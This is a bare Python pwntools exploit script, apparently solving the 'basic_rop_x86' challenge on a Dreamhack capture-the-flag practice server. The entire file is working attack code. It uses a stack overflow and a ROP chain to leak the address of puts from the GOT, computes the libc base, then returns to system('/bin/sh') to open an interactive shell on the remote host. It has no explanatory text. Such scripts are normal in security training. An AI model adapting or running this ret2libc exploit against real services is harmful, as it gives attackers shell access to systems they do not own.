#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./basic_rop_x86")
p = remote("host1.dreamhack.games", 8235)
elf = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")
pop_ebx = 0x80486a6

pay = 'A'*(0x44+0x4)
pay += p32(elf.plt['puts']) + p32(pop_ebx) + p32(elf.got['puts'])
pay += p32(elf.symbols['main'])

p.send(pay)
p.recvuntil('A'*0x40)
leak = u32(p.recvuntil('\xf7'))
log.info("leak : "+hex(leak))
libcBase = leak - libc.symbols['puts']
system = libcBase + libc.symbols['system']
binsh = libcBase + list(libc.search('/bin/sh'))[0]

#gdb.attach(p)

p.send('A'*(0x44+0x4) + p32(system) + p32(pop_ebx)  + p32(binsh))

p.interactive()
